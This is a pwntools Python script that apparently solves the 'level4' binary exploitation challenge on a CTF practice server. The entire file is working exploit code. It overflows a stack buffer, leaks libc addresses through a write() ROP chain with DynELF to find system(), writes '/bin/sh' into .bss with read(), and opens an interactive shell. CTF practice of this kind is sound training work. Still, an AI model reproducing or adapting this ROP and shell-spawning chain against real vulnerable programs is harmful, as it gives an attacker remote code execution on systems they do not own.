from pwn import *

#n = process('./level4')
n = remote('pwn2.jarvisoj.com',9880)
elf = ELF('./level4')

pop3addr = 0x08048509
offset = 0x88 + 4
main_addr = elf.symbols['main']
write_addr = elf.symbols['write']
read_addr = elf.symbols['read']
bss_addr = 0x0804A024

def leak(address):
	payload = 'a' * offset
	payload += p32(write_addr)
	payload	+= p32(pop3addr)
	payload += p32(1)
	payload += p32(address)
	payload += p32(4)
	payload += p32(main_addr)
	n.sendline(payload)
	data = n.recv(4)
	return data
d = DynELF(leak, elf=ELF("./level4"))
sys_addr = d.lookup('system', 'libc')

sh = '/bin/sh\x00'

payload = 'a' * offset
payload += p32(read_addr)
payload += p32(pop3addr)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(len(sh))
payload += p32(sys_addr)
payload += p32(1)
payload += p32(bss_addr)

n.send(payload)
n.send(sh)
n.interactive()
